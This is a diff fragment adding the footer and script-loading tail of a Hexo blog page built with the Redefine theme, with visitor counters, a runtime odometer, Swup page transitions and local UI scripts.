+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
